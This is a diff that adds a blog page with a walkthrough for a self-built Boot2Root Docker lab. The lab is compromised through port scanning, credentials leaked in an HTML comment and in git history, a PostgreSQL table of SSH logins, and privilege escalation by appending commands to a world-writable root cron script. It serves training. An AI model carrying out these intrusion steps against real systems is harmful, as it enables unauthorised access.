@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Little Juice Challenge — Boot2Root | Ricardo Ribeiro</title>
+<meta name="keywords" content="Boot2Root, Nmap, Git, PostgreSQL, Privilege Escalation, Docker">
+<meta name="description" content="A Boot2Root Docker challenge involving port scanning, Git repository exposure, lateral movement via PostgreSQL, and privilege escalation through a misconfigured cronjob.">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/wargaming/created/little-juice-challenge/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.89ca4972ab5e6aaa05e9a0dae0c4bb64b26585bc79e36f5cf33614eea0283abe.css" integrity="sha256-icpJcqteaqoF6aDa4MS7ZLJlhbx5429c8zYU7qAoOr4=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/wargaming/created/little-juice-challenge/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Ricardo Ribeiro (Alt + H)">Ricardo Ribeiro</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="http://localhost:1313/about/" title="About Me">
+                    <span>About Me</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/homelab/" title="Homelab">
+                    <span>Homelab</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/ctfs/" title="CTFs">
+                    <span>CTFs</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/wargaming/" title="Wargaming">
+                    <span>Wargaming</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/quick-writeups/" title="Quick Writeups">
+                    <span>Quick Writeups</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <nav class="breadcrumbs" role="navigation" aria-label="Breadcrumb">
+            <a href="/">Home</a>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+                <polyline points="9 18 15 12 9 6"></polyline>
+            </svg>
+            <a href="/wargaming/">Wargaming</a>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+                <polyline points="9 18 15 12 9 6"></polyline>
+            </svg>
+            <a href="/wargaming/created/">Challenges We Created</a>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+        <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+</nav>
+    <h1 class="post-title entry-hint-parent">
+      Little Juice Challenge — Boot2Root
+    </h1>
+    <div class="post-description">
+      A Boot2Root Docker challenge involving port scanning, Git repository exposure, lateral movement via PostgreSQL, and privilege escalation through a misconfigured cronjob.
+    </div>
+    <div class="post-meta">
+
+<span title='2026-06-03 00:00:00 +0000 UTC'>June 3, 2026</span>&nbsp;·&nbsp;<span>2 min</span>
+
+</div>
+  </header> 
+  <div class="post-content md-content"><h2 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h2>
+<p>&ldquo;Little Juice&rdquo; is a Boot-to-Root scenario simulating a real intrusion in a Docker-based infrastructure. The goal is to start from an external audit, map the attack surface, gain initial access, and escalate privileges progressively until achieving full root control and capturing the final flag.</p>
+<p>This challenge explores common misconfiguration flaws in corporate and DevOps environments.</p>
+<hr>
+<h2 id="techniques-covered">Techniques Covered<a hidden class="anchor" aria-hidden="true" href="#techniques-covered">#</a></h2>
+<ul>
+<li><strong>Scanning &amp; Reconnaissance:</strong> Enumeration of exposed ports and services.</li>
+<li><strong>Information Leakage:</strong> Accidental exposure of configuration files and hidden Git repositories.</li>
+<li><strong>Lateral Movement:</strong> Extracting credentials from databases to migrate access to interactive OS shells.</li>
+<li><strong>Privilege Escalation (Cronjobs):</strong> Exploiting automated tasks running with root privileges whose write permissions were granted to regular users.</li>
+</ul>
+<hr>
+<h2 id="challenge-setup">Challenge Setup<a hidden class="anchor" aria-hidden="true" href="#challenge-setup">#</a></h2>
+<p>The environment included a Ubuntu host running vsftpd, PostgreSQL, OpenSSH, git, and cron.</p>
+<p>Key vulnerabilities planted:</p>
+<ul>
+<li>FTP server on port 2121 exposing a <code>.git</code> directory containing a sensitive <code>config.php</code> in its commit history (credentials: <code>db_admin</code> / <code>G1t_Hub_Rocks!</code>)</li>
+<li>PostgreSQL on port 5433 configured to listen on all interfaces, containing SSH credentials in a <code>system_ssh</code> table</li>
+<li>SSH on port 2222</li>
+<li>HTTP server on port 8080</li>
+<li>A root cronjob running <code>/opt/sync_git.sh</code> every minute with <code>chmod 777</code> — writable by any user</li>
+</ul>
+<hr>
+<h2 id="solution-walkthrough">Solution Walkthrough<a hidden class="anchor" aria-hidden="true" href="#solution-walkthrough">#</a></h2>
+<h3 id="step-1--port-scanning">Step 1 — Port Scanning<a hidden class="anchor" aria-hidden="true" href="#step-1--port-scanning">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --min-rate <span style="color:#ae81ff">1000</span> 172.30.2.33
+</span></span></code></pre></div><p><strong>Ports discovered:</strong></p>
+<ul>
+<li><code>2121/tcp</code> — FTP (vsFTPd 3.0.5)</li>
+<li><code>2222/tcp</code> — SSH</li>
+<li><code>5433/tcp</code> — PostgreSQL</li>
+<li><code>8080/tcp</code> — HTTP</li>
+</ul>
+<hr>
+<h3 id="step-2--web-enumeration">Step 2 — Web Enumeration<a hidden class="anchor" aria-hidden="true" href="#step-2--web-enumeration">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://172.30.2.33:8080/robots.txt
+</span></span><span style="display:flex;"><span>curl http://172.30.2.33:8080/
+</span></span></code></pre></div><p>The <code>robots.txt</code> reveals a restricted <code>/README.txt</code>. An HTML comment in the page source exposes FTP credentials in plaintext:</p>
+<pre tabindex="0"><code>anonymous:An0nym0us-som3tim3s-r3quir3s-a-p4ssw0rd
+</code></pre><hr>
+<h3 id="step-3--web-hint">Step 3 — Web Hint<a hidden class="anchor" aria-hidden="true" href="#step-3--web-hint">#</a></h3>
+<p>Navigate to <code>Meet the Team &gt; Anthony Goes</code> — the hint points to checking <code>/opt</code> for maintenance scripts.</p>
+<hr>
+<h3 id="step-4--ftp--git-history-exploitation">Step 4 — FTP &amp; Git History Exploitation<a hidden class="anchor" aria-hidden="true" href="#step-4--ftp--git-history-exploitation">#</a></h3>
+<p>Log into FTP with the anonymous credentials. The <code>.git</code> directory is exposed. Recover the sensitive commit history:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git log
+</span></span><span style="display:flex;"><span>git show &lt;commit-hash&gt;
+</span></span></code></pre></div><p><strong>Credentials found:</strong> <code>db_admin</code> / <code>G1t_Hub_Rocks!</code></p>
+<hr>
+<h3 id="step-5--postgresql-lateral-movement">Step 5 — PostgreSQL Lateral Movement<a hidden class="anchor" aria-hidden="true" href="#step-5--postgresql-lateral-movement">#</a></h3>
+<p>Connect to the database using the recovered credentials:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>psql -h 172.30.2.33 -p <span style="color:#ae81ff">5433</span> -U db_admin
+</span></span><span style="display:flex;"><span>SELECT * FROM system_ssh;
+</span></span></code></pre></div><p><strong>SSH credentials found:</strong> <code>student</code> / <code>Ss8_4cceSS_2026#</code></p>
+<hr>
+<h3 id="step-6--ssh-access--zip-bomb">Step 6 — SSH Access &amp; Zip Bomb<a hidden class="anchor" aria-hidden="true" href="#step-6--ssh-access--zip-bomb">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh student@172.30.2.33 -p <span style="color:#ae81ff">2222</span>
+</span></span></code></pre></div><p>A <code>level50.zip</code> is waiting. Unpack all 50 nested levels automatically:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>f<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;level50.zip&#34;</span>; <span style="color:#66d9ef">while</span> <span style="color:#f92672">[[</span> -f <span style="color:#e6db74">&#34;</span>$f<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#e6db74">&#34;</span>$f<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">==</span> *.zip <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">do</span> n<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>unzip -Z1 <span style="color:#e6db74">&#34;</span>$f<span style="color:#e6db74">&#34;</span> | head -n1<span style="color:#66d9ef">)</span>; unzip -o <span style="color:#e6db74">&#34;</span>$f<span style="color:#e6db74">&#34;</span>; rm <span style="color:#e6db74">&#34;</span>$f<span style="color:#e6db74">&#34;</span>; f<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$n<span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">done</span>
+</span></span></code></pre></div><hr>
+<h3 id="step-7--privilege-escalation-via-cronjob">Step 7 — Privilege Escalation via Cronjob<a hidden class="anchor" aria-hidden="true" href="#step-7--privilege-escalation-via-cronjob">#</a></h3>
+<p>The root cronjob runs <code>/opt/sync_git.sh</code> every minute with world-write permissions. Inject a reverse shell or read the flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;cat /usr/lib/kernel/fl46_b00t2r00t&#39;</span> &gt;&gt; /opt/sync_git.sh
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Wait up to 1 minute for the cron to execute</span>
+</span></span></code></pre></div><hr>
+<h2 id="flag">Flag<a hidden class="anchor" aria-hidden="true" href="#flag">#</a></h2>
+<p><code>fLaG_fSt_{FiN4LLy_R00t}</code><br>
+<code>fLaG_fSt_{sCrIpTiNg_Is_AwEsOmE}</code></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/boot2root/">Boot2Root</a></li>
+      <li><a href="http://localhost:1313/tags/nmap/">Nmap</a></li>
+      <li><a href="http://localhost:1313/tags/git/">Git</a></li>
+      <li><a href="http://localhost:1313/tags/postgresql/">PostgreSQL</a></li>
+      <li><a href="http://localhost:1313/tags/privilege-escalation/">Privilege Escalation</a></li>
+      <li><a href="http://localhost:1313/tags/docker/">Docker</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/wargaming/solved/lacasa/">
+    <span class="title">« Prev</span>
+    <span>LaCasa — FTP, Steganography &amp; Privilege Escalation</span>
+  </a>
+  <a class="next" href="http://localhost:1313/wargaming/solved/meme-forum/">
+    <span class="title">Next »</span>
+    <span>Meme Forum — Port Knocking &amp; Password Cracking</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">Ricardo Ribeiro</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
